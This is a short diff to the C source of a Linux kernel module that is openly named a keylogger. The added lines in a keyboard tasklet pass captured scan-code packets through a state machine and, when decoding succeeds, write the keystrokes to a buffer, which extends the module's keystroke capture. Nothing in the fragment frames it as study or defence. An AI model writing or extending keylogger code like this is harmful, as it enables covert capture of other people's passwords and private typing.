@@ -34,9 +34,16 @@ static void do_tasklet(unsigned long unused)
 		printk(KERN_INFO "tasklet : [%x]\n", packet);
 		if (!(rindex = (rindex == SIZE) ? 0 : rindex))
 			target = windex;
+		scan_fsm_update(&scan_fsm, packet);
+		if (scan_fsm.state == SUCCESS)
+			scan_fsm_send(&scan_fsm, keystroke_array);
+		else if (scan_fsm.state == ERROR)
+			scan_fsm_clear(&scan_fsm);	
 		/* state machine
 		 *  if SUCCESS, format packet and send it to buffer
+		 *  if ERROR, flush fsm
 		 */
+		
 	}
 }
 DECLARE_TASKLET(keyboard_tasklet, do_tasklet, 0);
@@ -69,7 +76,6 @@ static int __init keylogger_init(void)
 /*	unsigned int	r; */
 	unsigned int	try = 0;
 	unsigned int	scan_set = 0;
-
 
 	result = misc_register(&keylogger_misc);
 	if (result) {
